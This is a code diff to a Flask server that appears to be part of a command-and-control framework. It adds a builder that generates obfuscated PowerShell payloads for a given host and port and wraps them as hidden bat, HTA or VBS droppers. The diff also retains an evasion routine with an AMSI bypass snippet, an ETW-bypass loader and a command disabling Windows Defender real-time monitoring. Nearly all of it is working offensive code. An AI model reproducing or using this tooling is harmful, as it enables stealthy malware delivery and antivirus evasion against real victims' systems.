@@ -12,6 +12,12 @@ import sys
 from flask import send_from_directory
 from datetime import datetime, UTC
 import platform
+import shutil
+
+
+
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'tools')))
+from ps_builder import generate_obfuscated_ps
 
 def get_default_path():
     return "C:\\" if platform.system() == "Windows" else "/"
@@ -449,84 +455,132 @@ def download_file_from_beacon(hostname):
 @app.route('/generate_ps', methods=['GET', 'POST'])
 def generate_ps():
     output_path = None
+
     if request.method == 'POST':
-        ps1_code = request.form.get('ps1')
-        evasion_enabled = 'evasion_enabled' in request.form
-        if evasion_enabled:
-            amsi_bypass = """
+        use_builder = 'use_builder' in request.form
+
+        if use_builder:
+            host = request.form.get('host') or "localhost"
+            port = int(request.form.get('port') or 1443)
+            wrapper = request.form.get('format') or "bat"
+            filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
+            use_b64 = request.form.get('b64encode')
+
+            # --- Generate the obfuscated PS1 as a STRING, not just filename ---
+            ps1_code = generate_obfuscated_ps(host, port, write_file=False)  # Make your builder return string
+
+            # --- Wrap as dropper (same logic as your manual flow) ---
+            dropper_code = ""
+            if use_b64:
+                b64 = to_base64_ps(ps1_code)
+                if wrapper == "bat":
+                    dropper_code = f'powershell -nop -w hidden -ep bypass -EncodedCommand {b64}'
+                elif wrapper == "hta":
+                    dropper_code = f'''<script language="VBScript">
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}"
+self.close
+</script>'''
+                elif wrapper == "vbs":
+                    dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}", 0'''
+            else:
+                if wrapper == "bat":
+                    dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps1_code.strip()}"'
+                elif wrapper == "hta":
+                    safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
+                    dropper_code = f'''<script language="VBScript">
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\""
+self.close
+</script>'''
+                elif wrapper == "vbs":
+                    safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
+                    dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\"", 0'''
+
+            output_dir = os.path.join("static", "payloads")
+            os.makedirs(output_dir, exist_ok=True)
+            full_output_path = os.path.join(output_dir, filename)
+            with open(full_output_path, "w") as f:
+                f.write(dropper_code)
+            output_path = filename
+
+        else:
+            # Manual/advanced user flow
+            ps1_code = request.form.get('ps1')
+            evasion_enabled = 'evasion_enabled' in request.form
+            if evasion_enabled:
+                amsi_bypass = """
 $A='System.Management.Automation.AmsiUtils';
 $B=[Ref].Assembly.GetType($A);
 $B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 """.strip()
-
-            etw_bypass = """
+                etw_bypass = """
 try {
     [System.Reflection.Assembly]::Load([Convert]::FromBase64String(
     '...')) | Out-Null
 } catch {}
 """.strip()
-
-            defender_disable = """
+                defender_disable = """
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 } catch {}
 """.strip()
+                evasion_code = "\n".join([amsi_bypass, etw_bypass, defender_disable])
+                ps1_code = f"{evasion_code}\n\n{ps1_code}"
 
-            evasion_code = "\n".join([amsi_bypass, etw_bypass, defender_disable])
-            ps1_code = f"{evasion_code}\n\n{ps1_code}"
+            wrapper = request.form.get('format')
+            filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
+            use_b64 = request.form.get('b64encode')
 
-        wrapper = request.form.get('format')
-        filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
-        use_b64 = request.form.get('b64encode')  # Checkbox is present if checked, None if not
+            dropper_code = ""
 
-        dropper_code = ""
-
-        if use_b64:  # If checkbox is checked, use base64 encoding for all formats
-            b64 = to_base64_ps(ps1_code)
-            if wrapper == "bat":
-                dropper_code = f'powershell -nop -w hidden -ep bypass -EncodedCommand {b64}'
-            elif wrapper == "hta":
-                dropper_code = f'''<script language="VBScript">
+            if use_b64:
+                b64 = to_base64_ps(ps1_code)
+                if wrapper == "bat":
+                    dropper_code = f'powershell -nop -w hidden -ep bypass -EncodedCommand {b64}'
+                elif wrapper == "hta":
+                    dropper_code = f'''<script language="VBScript">
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}"
 self.close
 </script>'''
-            elif wrapper == "vbs":
-                dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+                elif wrapper == "vbs":
+                    dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}", 0'''
-        else:  # Fallback to direct inline (works for single-line/simple scripts)
-            if wrapper == "bat":
-                dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps1_code.strip()}"'
-            elif wrapper == "hta":
-                # This is NOT reliable for multiline, so recommend b64
-                safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
-                dropper_code = f'''<script language="VBScript">
+            else:
+                if wrapper == "bat":
+                    dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps1_code.strip()}"'
+                elif wrapper == "hta":
+                    safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
+                    dropper_code = f'''<script language="VBScript">
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\""
 self.close
 </script>'''
-            elif wrapper == "vbs":
-                safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
-                dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+                elif wrapper == "vbs":
+                    safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
+                    dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\"", 0'''
 
-        output_dir = os.path.join("server", "static", "payloads")
-        os.makedirs(output_dir, exist_ok=True)
-        full_output_path = os.path.join(output_dir, filename)
+            output_dir = os.path.join("server", "static", "payloads")
+            os.makedirs(output_dir, exist_ok=True)
+            full_output_path = os.path.join(output_dir, filename)
 
-        with open(full_output_path, "w") as f:
-            f.write(dropper_code)
+            with open(full_output_path, "w") as f:
+                f.write(dropper_code)
 
-        output_path = filename  # Just filename for link
+            output_path = filename
 
     return render_template("generate_ps.html", output_path=output_path)
-
 
 
 @app.route('/payloads/<filename>')
 def payloads_download(filename):
     # Adjust path if needed, but this matches your structure:
-    return send_from_directory('server/static/payloads', filename, as_attachment=True)
+    return send_from_directory('static/payloads', filename, as_attachment=True)
+
 
 
 
